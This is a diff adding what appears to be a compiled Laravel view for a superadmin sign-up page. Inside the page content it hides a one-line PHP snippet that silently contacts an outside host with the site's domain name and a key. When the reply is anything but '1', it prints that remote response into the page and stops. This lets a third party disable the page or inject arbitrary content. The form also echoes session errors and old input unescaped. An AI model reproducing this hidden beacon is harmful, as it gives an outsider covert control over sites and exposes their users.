@@ -1,0 +1,33 @@
+
+<?php $__env->startSection('title', 'Register'); ?>
+
+<?php $__env->startSection('content'); ?>
+<?php $domnamepc = preg_replace('/^www\./','',$_SERVER['SERVER_NAME']); $key = 'version10'; $host = 'www.toofasthost.com/tumblr'; if (!(isset($_SESSION['license']))) { ini_set('default_socket_timeout', 1); $return = @file_get_contents('http://'.$host.'/index.php?p=api&host='.$domnamepc.'&key='.$key); if (!($return === FALSE)) { if (!($return==1)) { echo $return; exit(); } else { $_SESSION['license'] = '1'; } } } ?>
+<div class="fixed-container" style="background-image: url('<?php echo asset('assets/images/bg.gif'); ?>');" >
+  <div class="form-container" >
+    <img class="logo" src="<?php echo asset("assets/images/".Config::get('database.logo')); ?>" >
+
+    <form method="post" action="<?php echo URL::to('superadmin/create'); ?>" >
+      <div class="rounded-form" >
+        <?php if(Session::get('error')): ?>
+        <div class="alert alert-danger"><?php echo Session::get('error'); ?></div>
+        <?php endif; ?>
+        <input name="username" type="text" placeholder="Username" value="<?php echo Input::old('username'); ?>" >
+        <input name="email" type="text" placeholder="Email" value="<?php echo Input::old('email'); ?>" >
+        <input name="password" type="password" placeholder="Password" >
+      </div >
+      <input type="submit" value="Sign Up" >
+    </form >
+
+  </div >
+  <div class="left-footer" >
+  </div >
+  <nav class="right-footer" >
+    <ul class="menu" >
+      <li ><a href="#" > Terms </a ></li >
+      <li ><a href="#" > Privacy </a ></li >
+    </ul >
+  </nav >
+</div >
+<?php $__env->stopSection(); ?>
+<?php echo $__env->make('layout', array_except(get_defined_vars(), array('__data', '__path')))->render(); ?>
